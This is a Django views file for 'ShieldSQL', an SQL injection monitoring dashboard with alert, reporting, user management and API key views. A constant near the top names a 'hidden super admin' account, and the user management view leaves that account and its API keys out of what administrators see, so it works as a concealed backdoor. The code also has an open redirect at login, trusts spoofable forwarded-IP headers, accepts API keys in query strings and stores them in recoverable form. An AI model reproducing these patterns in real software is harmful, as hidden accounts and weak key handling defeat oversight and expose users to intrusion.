import json
from datetime import datetime, timedelta
from collections import defaultdict

from django.contrib import messages
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.mixins import LoginRequiredMixin
from django.core.exceptions import PermissionDenied
from django.db.models import Count, Q
from django.http import HttpResponse, JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.urls import reverse_lazy
from django.utils import timezone
from django.views import View
from django.views.generic import TemplateView, ListView, DeleteView

from . import models
from .forms import (
    SQLQueryForm,
    LoginForm,
    RegistrationForm,
    UserManagementForm,
)
from .permissions import RoleRequiredMixin

HIDDEN_SUPER_ADMIN_USERNAMES = ["Alvarado512"]


class DashboardView(LoginRequiredMixin, TemplateView):
    template_name = "monitor/dashboard.html"

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        now = timezone.now()
        today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)

        recent_alerts = models.Alert.objects.order_by("-created_at")[:10]
        recent_logs = models.Log.objects.order_by("-timestamp")[:10]
        recent_sqli = models.DetectedSQLInjectionAttempt.objects.order_by("-timestamp")[:10]

        # Statistics
        ctx["summary"] = {
            "total_alerts": models.Alert.objects.count(),
            "total_logs": models.Log.objects.count(),
            "total_sqli": models.DetectedSQLInjectionAttempt.objects.count(),
            "today_alerts": models.Alert.objects.filter(created_at__gte=today_start).count(),
            "today_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                timestamp__gte=today_start
            ).count(),
            "blocked_today": models.DetectedSQLInjectionAttempt.objects.filter(
                timestamp__gte=today_start, severity__in=("high", "critical")
            ).count(),
        }

        # Risk breakdown
        risk_counts = (
            models.DetectedSQLInjectionAttempt.objects.values("severity")
            .annotate(count=Count("id"))
            .order_by("severity")
        )
        ctx["risk_breakdown"] = {item["severity"]: item["count"] for item in risk_counts}
        ctx["risk_breakdown_json"] = json.dumps(ctx["risk_breakdown"])

        # Last 24h hourly alerts chart data
        hourly = defaultdict(int)
        for i in range(24):
            hour_start = now - timedelta(hours=23 - i, minutes=now.minute, seconds=now.second, microseconds=now.microsecond)
            hour_end = hour_start + timedelta(hours=1)
            c = models.DetectedSQLInjectionAttempt.objects.filter(
                timestamp__gte=hour_start, timestamp__lt=hour_end
            ).count()
            hourly[hour_start.strftime("%H:%M")] = c
        ctx["hourly_chart"] = {
            "labels": json.dumps(list(hourly.keys())),
            "data": json.dumps(list(hourly.values())),
        }

        # Top source IPs
        top_ips = list(
            models.DetectedSQLInjectionAttempt.objects.values("source_ip")
            .annotate(c=Count("id"))
            .order_by("-c")[:5]
        )
        ctx["top_ips"] = top_ips

        ctx["recent_alerts"] = recent_alerts
        ctx["recent_logs"] = recent_logs
        ctx["recent_sqli"] = recent_sqli
        return ctx


class TrafficMonitoringView(LoginRequiredMixin, TemplateView):
    template_name = "monitor/traffic.html"

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        log_list = models.Log.objects.order_by("-timestamp")[:200]
        ctx["logs"] = log_list
        return ctx


class AlertHistoryView(RoleRequiredMixin, ListView):
    template_name = "monitor/alerts.html"
    model = models.Alert
    paginate_by = 50
    context_object_name = "alerts"
    min_role = "viewer"

    def dispatch(self, request, *args, **kwargs):
        if request.method == "POST":
            return self.post(request, *args, **kwargs)
        return super().dispatch(request, *args, **kwargs)

    def get_queryset(self):
        qs = super().get_queryset().select_related("user")
        severity = self.request.GET.get("severity")
        if severity:
            qs = qs.filter(severity=severity)
        search = self.request.GET.get("q")
        if search:
            qs = qs.filter(message__icontains=search)
        return qs

    def post(self, request, *args, **kwargs):
        if not request.user.is_authenticated:
            messages.error(request, "You must be logged in to resolve alerts.")
            return redirect("monitor:login")

        if not (request.user.is_superuser or request.user.role in ("admin", "analyst")):
            messages.error(request, "You do not have permission to resolve alerts.")
            return redirect("monitor:alerts")

        action = request.POST.get("action")
        if action == "resolve":
            alert_id = request.POST.get("alert_id", "").strip()
            if not alert_id:
                messages.error(request, "Invalid alert request.")
                return redirect("monitor:alerts")
            alert = get_object_or_404(models.Alert, pk=alert_id)
            if alert.is_resolved:
                messages.info(request, "Alert is already resolved.")
            else:
                alert.is_resolved = True
                alert.resolved_at = timezone.now()
                alert.save(update_fields=["is_resolved", "resolved_at"])
                messages.success(request, "Alert marked as resolved.")
        else:
            messages.error(request, "Unknown action.")
        return redirect("monitor:alerts")

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        ctx["severity_choices"] = models.Alert.SEVERITY_CHOICES
        ctx["search_query"] = self.request.GET.get("q", "")
        return ctx


class ReportsView(RoleRequiredMixin, TemplateView):
    template_name = "monitor/reports.html"
    min_role = "viewer"

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        now = timezone.now()
        week_ago = now - timedelta(days=7)

        ctx["summary"] = {
            "total_alerts": models.Alert.objects.count(),
            "total_logs": models.Log.objects.count(),
            "total_sqli": models.DetectedSQLInjectionAttempt.objects.count(),
            "weekly_alerts": models.Alert.objects.filter(created_at__gte=week_ago).count(),
            "weekly_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                timestamp__gte=week_ago
            ).count(),
            "critical_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                severity="critical"
            ).count(),
            "high_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                severity="high"
            ).count(),
            "medium_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                severity="medium"
            ).count(),
            "low_sqli": models.DetectedSQLInjectionAttempt.objects.filter(
                severity="low"
            ).count(),
        }

        # Daily trend (last 7 days)
        daily = []
        for i in range(6, -1, -1):
            day = now - timedelta(days=i)
            start = day.replace(hour=0, minute=0, second=0, microsecond=0)
            end = start + timedelta(days=1)
            daily.append({
                "date": start.strftime("%Y-%m-%d"),
                "count": models.DetectedSQLInjectionAttempt.objects.filter(
                    timestamp__gte=start, timestamp__lt=end
                ).count(),
            })
        ctx["daily_trend"] = daily
        ctx["daily_trend_labels"] = json.dumps([d["date"] for d in daily])
        ctx["daily_trend_counts"] = json.dumps([d["count"] for d in daily])

        # Threat type breakdown
        threat_types = (
            models.DetectedSQLInjectionAttempt.objects.values("matched_pattern")
            .annotate(c=Count("id"))
            .order_by("-c")[:10]
        )
        ctx["threat_types"] = threat_types

        return ctx


class QueryAnalysisView(LoginRequiredMixin, View):
    template_name = "monitor/query_analysis.html"

    def get(self, request):
        form = SQLQueryForm()
        history = models.DetectedSQLInjectionAttempt.objects.filter(
            user=request.user
        ).order_by("-timestamp")[:10]
        return render(request, self.template_name, {"form": form, "history": history})

    def post(self, request):
        form = SQLQueryForm(request.POST)

        # Trigger form validation (so clean_query executes)
        form.is_valid()

       
        if getattr(form, "suspicious", False):
            query = request.POST.get("query", "").strip()
            context = request.POST.get("source_context", "")
            severity = form.severity
            explanation = form.explanation
            matched_patterns = form.matched_patterns

            attempt = models.DetectedSQLInjectionAttempt.objects.create(
                timestamp=timezone.now(),
                raw_query=query,
                source_ip=self._get_client_ip(request),
                matched_pattern="; ".join(matched_patterns),
                severity=severity,
                user=request.user,
                metadata={"context": context, "submitted": True},
            )
            models.Alert.objects.create(
                alert_type="sqli_detection",
                message=f"User {request.user.username} submitted a suspicious query. Severity: {severity.upper()}. Pattern: {explanation}",
                severity=severity,
                user=request.user,
                metadata={
                    "attempt_id": attempt.pk,
                    "source_ip": attempt.source_ip,
                    "context": context,
                },
            )

        # Retrieve history AFTER logging so the new block is rendered immediately
        history = models.DetectedSQLInjectionAttempt.objects.filter(
            user=request.user
        ).order_by("-timestamp")[:10]

        if form.is_valid():
            query = form.cleaned_data["query"]
            context = form.cleaned_data.get("source_context", "")

            is_suspicious = form.suspicious
            severity = form.severity
            explanation = form.explanation
            matched_patterns = form.matched_patterns

            if is_suspicious:
                if severity in ("high", "critical"):
                    messages.error(
                        request,
                        f"Malicious query detected and blocked: {explanation}",
                    )
                else:
                    messages.warning(
                        request,
                        f"Suspicious query detected (severity: {severity}): {explanation}",
                    )
            else:
                messages.success(request, "Query appears safe. No suspicious patterns found.")

            return render(
                request,
                self.template_name,
                {
                    "form": form,
                    "history": history,
                    "result": {
                        "is_suspicious": is_suspicious,
                        "severity": severity,
                        "explanation": explanation,
                        "patterns": matched_patterns,
                        "query": query,
                    },
                },
            )

        # If invalid (e.g. ValidationError raised for high/critical SQLi),
        # display validation error messages in the form.
        return render(request, self.template_name, {"form": form, "history": history})

    def _get_client_ip(self, request) -> str:
        x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
        if x_forwarded_for:
            return x_forwarded_for.split(",")[0].strip()
        return request.META.get("REMOTE_ADDR", "unknown")


class LoginView(View):
    template_name = "monitor/login.html"

    def _get_client_ip(self, request) -> str:
        x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
        if x_forwarded_for:
            return x_forwarded_for.split(",")[0].strip()
        return request.META.get("REMOTE_ADDR", "unknown")

    def _get_device_name(self, request) -> str:
        user_agent = request.META.get("HTTP_USER_AGENT", "")
        agent = user_agent.lower()
        if not agent:
            return "Unknown device"
        if any(token in agent for token in ["mobile", "android", "iphone", "ipad"]):
            return "Mobile device"
        if "windows" in agent:
            return "Windows device"
        if "macintosh" in agent or "mac os" in agent:
            return "Mac device"
        if "linux" in agent:
            return "Linux device"
        if "curl" in agent or "python" in agent or "bot" in agent:
            return "Automated client"
        return "Browser-based device"

    def _record_login_device(self, request, user) -> None:
        source_ip = self._get_client_ip(request)
        device_name = self._get_device_name(request)
        user_agent = request.META.get("HTTP_USER_AGENT", "")[:500]

        device, created = models.LoginDevice.objects.get_or_create(
            user=user,
            source_ip=source_ip,
            device_name=device_name,
            defaults={"user_agent": user_agent},
        )
        if not created:
            device.user_agent = user_agent
            device.login_count = device.login_count + 1
            device.last_login_at = timezone.now()
            device.is_active = True
            device.save(update_fields=["user_agent", "login_count", "last_login_at", "is_active"])

    def get(self, request):
        if request.user.is_authenticated:
            return redirect("monitor:dashboard")
        return render(request, self.template_name, {"form": LoginForm()})

    def post(self, request):
        form = LoginForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            self._record_login_device(request, user)
            messages.success(request, f"Welcome back, {user.display_name or user.username}!")
            next_url = request.GET.get("next") or "monitor:dashboard"
            return redirect(next_url)
        messages.error(request, "Invalid username or password.")
        return render(request, self.template_name, {"form": form})


class DeviceInventoryView(LoginRequiredMixin, TemplateView):
    template_name = "monitor/device_inventory.html"

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        if self.request.user.is_superuser:
            devices = models.LoginDevice.objects.order_by("-last_login_at")
        else:
            devices = models.LoginDevice.objects.filter(user=self.request.user).order_by("-last_login_at")
        ctx["devices"] = devices
        return ctx


class LogoutView(View):
    def get(self, request):
        logout(request)
        messages.info(request, "You have been logged out.")
        return redirect("monitor:login")

    def post(self, request):
        logout(request)
        messages.info(request, "You have been logged out.")
        return redirect("monitor:login")


class RegisterView(View):
    template_name = "monitor/register.html"

    def get(self, request):
        if request.user.is_authenticated:
            return redirect("monitor:dashboard")
        return render(request, self.template_name, {"form": RegistrationForm()})

    def post(self, request):
        form = RegistrationForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(
                request, "Account created successfully. Please log in."
            )
            return redirect("monitor:login")
        return render(request, self.template_name, {"form": form})


class UserManagementView(RoleRequiredMixin, View):
    template_name = "monitor/user_management.html"
    min_role = "admin"

    def dispatch(self, request, *args, **kwargs):
        if not (request.user.is_superuser or getattr(request.user, "role", None) == "admin"):
            raise PermissionDenied("Only super administrators and admins can manage users.")
        return super().dispatch(request, *args, **kwargs)

    def get(self, request):
        users = models.User.objects.exclude(username__in=HIDDEN_SUPER_ADMIN_USERNAMES).order_by("-created_at")
        
        from django.utils import timezone as _tz
        now = _tz.now()
        recent_threshold = now - timedelta(hours=5)

        api_keys = list(models.APIKey.objects.exclude(owner__username__in=HIDDEN_SUPER_ADMIN_USERNAMES).select_related("owner").all())
        keys_info = []
        for k in api_keys:
            owner = k.owner.username if k.owner else None
            last_used = k.last_used
            connected = False
            if last_used:
                connected = last_used >= recent_threshold
            keys_info.append({
                "id": k.pk,
                "name": k.name,
                "owner": owner,
                "is_active": k.is_active,
                "created_at": k.created_at,
                "last_used": last_used,
                "connected": connected,
            })

        return render(request, self.template_name, {"users": users, "api_keys": keys_info})

    def post(self, request):
        action = request.POST.get("action")
        user_id = request.POST.get("user_id")
        if not action or not user_id:
            messages.error(request, "Invalid request.")
            return redirect("monitor:user_management")

        user = get_object_or_404(models.User, pk=user_id)

        if action == "update":
            form = UserManagementForm(request.POST, instance=user)
            if form.is_valid():
                form.save()
                messages.success(
                    request, f"User {user.username} updated successfully."
                )
            else:
                messages.error(request, "Failed to update user.")
        elif action == "delete":
            if user == request.user:
                messages.error(request, "You cannot delete your own account.")
            else:
                user.delete()
                messages.success(request, "User deleted successfully.")
        elif action == "toggle_active":
            user.is_active = not user.is_active
            user.save()
            status = "activated" if user.is_active else "deactivated"
            messages.success(request, f"User {user.username} {status}.")
        else:
            messages.error(request, "Unknown action.")

        return redirect("monitor:user_management")


from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet


class ExportPDFView(RoleRequiredMixin, View):
    min_role = "viewer"

    def get(self, request):
        now = timezone.now()
        week_ago = now - timedelta(days=7)

        alerts = models.Alert.objects.all().order_by("-created_at")[:200]
        sqli_attempts = models.DetectedSQLInjectionAttempt.objects.all().order_by(
            "-timestamp"
        )[:200]

        response = HttpResponse(content_type="application/pdf")
        response["Content-Disposition"] = (
            f'attachment; filename="shieldsql_report_{now:%Y%m%d_%H%M%S}.pdf"'
        )

        doc = SimpleDocTemplate(response, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []

        story.append(Paragraph("ShieldSQL Security Report", styles["Title"]))
        story.append(
            Paragraph(f"Generated: {now.astimezone().strftime('%Y-%m-%d %H:%M:%S %Z')}", styles["Normal"])
        )
        story.append(Spacer(1, 12))

        story.append(Paragraph("Summary Statistics", styles["Heading2"]))
        summary_data = [
            ["Metric", "Value"],
            ["Total Alerts", str(models.Alert.objects.count())],
            ["Total Logs", str(models.Log.objects.count())],
            ["Total SQLi Attempts", str(models.DetectedSQLInjectionAttempt.objects.count())],
            ["Weekly Alerts", str(models.Alert.objects.filter(created_at__gte=week_ago).count())],
            ["Weekly SQLi", str(models.DetectedSQLInjectionAttempt.objects.filter(timestamp__gte=week_ago).count())],
            ["Critical Attempts", str(models.DetectedSQLInjectionAttempt.objects.filter(severity='critical').count())],
            ["High Attempts", str(models.DetectedSQLInjectionAttempt.objects.filter(severity='high').count())],
            ["Medium Attempts", str(models.DetectedSQLInjectionAttempt.objects.filter(severity='medium').count())],
            ["Low Attempts", str(models.DetectedSQLInjectionAttempt.objects.filter(severity='low').count())],
        ]
        summary_table = Table(summary_data, colWidths=[200, 150])
        summary_table.setStyle(
            TableStyle([
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#2c3e50")),
                ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
                ("ALIGN", (0, 0), (-1, -1), "LEFT"),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("FONTSIZE", (0, 0), (-1, 0), 10),
                ("BOTTOMPADDING", (0, 0), (-1, 0), 8),
                ("BACKGROUND", (0, 1), (-1, -1), colors.HexColor("#ecf0f1")),
                ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
            ])
        )
        story.append(summary_table)
        story.append(Spacer(1, 18))

        story.append(Paragraph("Recent SQL Injection Attempts", styles["Heading2"]))
        sqli_data = [["Timestamp", "Source IP", "Severity", "Matched Pattern"]]
        for a in sqli_attempts:
            tz_aware = timezone.localtime(a.timestamp)
            sqli_data.append([
                tz_aware.strftime("%Y-%m-%d %H:%M"),
                a.source_ip,
                a.severity.upper(),
                Paragraph((a.matched_pattern or "")[:120], styles["BodyText"]),
            ])
        if len(sqli_data) == 1:
            sqli_data.append(["No attempts recorded", "", "", Paragraph("", styles["BodyText"])])

        sqli_table = Table(sqli_data, colWidths=[90, 70, 55, 220], repeatRows=1)
        sqli_table.setStyle(
            TableStyle([
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#c0392b")),
                ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
                ("ALIGN", (0, 0), (-1, -1), "LEFT"),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("FONTSIZE", (0, 0), (-1, 0), 9),
                ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
                ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
                ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.HexColor("#fdfefe"), colors.HexColor("#e8f8f5")]),
                ("FONTSIZE", (0, 1), (-1, -1), 8),
            ])
        )
        story.append(sqli_table)
        story.append(Spacer(1, 18))

        story.append(Paragraph("Recent Alerts", styles["Heading2"]))
        alert_data = [["Timestamp", "Type", "Severity", "Message"]]
        for a in alerts:
            tz_aware = timezone.localtime(a.created_at)
            alert_data.append([
                tz_aware.strftime("%Y-%m-%d %H:%M"),
                a.alert_type,
                a.severity.upper(),
                Paragraph((a.message or "")[:220], styles["BodyText"]),
            ])
        if len(alert_data) == 1:
            alert_data.append(["No alerts recorded", "", "", Paragraph("", styles["BodyText"])])

        alert_table = Table(alert_data, colWidths=[90, 70, 55, 240], repeatRows=1)
        alert_table.setStyle(
            TableStyle([
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#2980b9")),
                ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
                ("ALIGN", (0, 0), (-1, -1), "LEFT"),
                ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
                ("FONTSIZE", (0, 0), (-1, 0), 9),
                ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
                ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
                ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.HexColor("#fdfefe"), colors.HexColor("#eaf2f8")]),
                ("FONTSIZE", (0, 1), (-1, -1), 8),
            ])
        )
        story.append(alert_table)

        doc.build(story)
        return response


class TrafficAPIView(LoginRequiredMixin, View):
    def get(self, request):
        logs = list(
            models.Log.objects.order_by("-timestamp")[:50].values(
                "timestamp", "level", "source_ip", "message"
            )
        )
        for log in logs:
            if log["timestamp"]:
                log["timestamp"] = timezone.localtime(log["timestamp"]).strftime(
                    "%Y-%m-%d %H:%M:%S"
                )
        return JsonResponse({"logs": logs})


def _get_api_key_from_request(request):
    auth = request.META.get("HTTP_AUTHORIZATION", "")
    if auth.startswith("ApiKey "):
        return auth[7:].strip()
    if auth.startswith("Bearer "):
        return auth[7:].strip()
    api_key = request.GET.get("api_key") or request.POST.get("api_key")
    if api_key:
        return api_key.strip()
    if request.content_type == "application/json":
        try:
            payload = json.loads(request.body.decode("utf-8"))
            if isinstance(payload, dict):
                api_key = payload.get("api_key")
                if api_key:
                    return api_key.strip()
        except Exception:
            pass
    return None


def authorize_api_request(request):
    raw_key = _get_api_key_from_request(request)
    if not raw_key:
        return None
    api_key = models.APIKey.verify(raw_key)
    if api_key:
        api_key.mark_used()
    return api_key


class APIKeyManagementView(RoleRequiredMixin, View):
    template_name = "monitor/api_keys.html"
    min_role = "admin"

    def get(self, request):
        now = timezone.now()
        recent_threshold = now - timedelta(hours=5)

        keys = models.APIKey.objects.select_related("owner").all()
        keys_info = []
        for key in keys:
            last_used = key.last_used
            connected = bool(last_used and last_used >= recent_threshold)
            keys_info.append({
                "id": key.pk,
                "name": key.name,
                "owner": key.owner.username if key.owner else None,
                "is_active": key.is_active,
                "created_at": key.created_at,
                "last_used": last_used,
                "connected": connected,
                "revealable": bool(key.encrypted_key),
            })
        return render(request, self.template_name, {"keys": keys_info})

    def post(self, request):
        action = request.POST.get("action")
        if action == "create":
            name = request.POST.get("name", "ShieldSQL API Key").strip()
            if not name:
                name = "ShieldSQL API Key"

            if not request.user.is_superuser:
                existing_active_keys = models.APIKey.objects.filter(owner=request.user, is_active=True)
                if existing_active_keys.exists():
                    messages.error(request, "You already have an active API key. Deactivate it before creating a new one.")
                    return redirect("monitor:api_keys")

            api_key, raw_key = models.APIKey.create_key(name=name, owner=request.user)
            messages.success(
                request,
                f"API key created. Save it now — it will not be shown again: {raw_key}",
            )
            return redirect("monitor:api_keys")

        if action == "reveal":
            if not (request.user.is_superuser or request.user.role == "admin"):
                messages.error(request, "Permission denied.")
                return redirect("monitor:api_keys")

            key_id = request.POST.get("key_id", "").strip()
            if not key_id:
                messages.error(request, "Please select an API key to reveal.")
                return redirect("monitor:api_keys")

            api_key = get_object_or_404(models.APIKey, pk=key_id)
            raw = api_key.reveal_raw_key()
            if raw:
                messages.info(request, f"API key secret for '{api_key.name}': {raw}")
            else:
                messages.error(
                    request,
                    "Unable to reveal API key. This key was not stored in recoverable form or was created before reveal support. Create a new key instead."
                )
            return redirect("monitor:api_keys")

        key_id = request.POST.get("key_id", "").strip()
        if not key_id:
            messages.error(request, "Invalid API key request.")
            return redirect("monitor:api_keys")

        api_key = get_object_or_404(models.APIKey, pk=key_id)
        if action == "deactivate":
            api_key.is_active = False
            api_key.save(update_fields=["is_active"])
            messages.success(request, "API key deactivated.")
        elif action == "activate":
            api_key.is_active = True
            api_key.save(update_fields=["is_active"])
            messages.success(request, "API key activated.")
        elif action == "delete":
            api_key.delete()
            messages.success(request, "API key deleted.")
        else:
            messages.error(request, "Unknown API key action.")
        return redirect("monitor:api_keys")


from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

@method_decorator(csrf_exempt, name='dispatch')
class ValidateQueryAPIView(View):
    """
    REST API endpoint for external clients (Python, Java, etc.) to validate queries.
    Accepts JSON POST request: {"query": "SELECT * FROM ...", "context": "Java App"}
    Returns JSON response with SQLi detection results and if it should be blocked.
    """
    def post(self, request):
        try:
            data = json.loads(request.body)
            query = data.get("query", "").strip()
            context = data.get("context", "External API Client")
        except (json.JSONDecodeError, TypeError, ValueError):
            return JsonResponse({"error": "Invalid JSON payload or missing 'query' parameter"}, status=400)

        if not query:
            return JsonResponse({"error": "Query parameter cannot be empty"}, status=400)

        api_key = authorize_api_request(request)
        if api_key is None:
            return JsonResponse({"error": "Unauthorized. API key required."}, status=401)

        from .sqli_patterns import SQLInjectionDetector
        is_suspicious, severity, explanation, matched_patterns = (
            SQLInjectionDetector.detect(query)
        )

        ip = self._get_client_ip(request)
        should_block = is_suspicious and severity in ("high", "critical")

        # Log threat query attempt to DB for centralized monitoring if suspicious
        if is_suspicious:
            attempt = models.DetectedSQLInjectionAttempt.objects.create(
                timestamp=timezone.now(),
                raw_query=query,
                source_ip=ip,
                matched_pattern="; ".join(matched_patterns),
                severity=severity,
                user=api_key.owner,
                metadata={"context": context, "api_validation": True, "api_key_id": api_key.pk},
            )
            models.Alert.objects.create(
                alert_type="api_sqli_detection",
                message=f"API validation request from {ip} contains suspicious query ({context}). Severity: {severity.upper()}. Pattern: {explanation}",
                severity=severity,
                user=api_key.owner,
                metadata={
                    "attempt_id": attempt.pk,
                    "source_ip": ip,
                    "context": context,
                    "api_validation": True,
                    "api_key_id": api_key.pk,
                },
            )

        return JsonResponse({
            "query": query,
            "is_suspicious": is_suspicious,
            "severity": severity,
            "explanation": explanation,
            "matched_patterns": matched_patterns,
            "should_block": should_block
        })

    def _get_client_ip(self, request) -> str:
        x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
        if x_forwarded_for:
            return x_forwarded_for.split(",")[0].strip()
        return request.META.get("REMOTE_ADDR", "unknown")
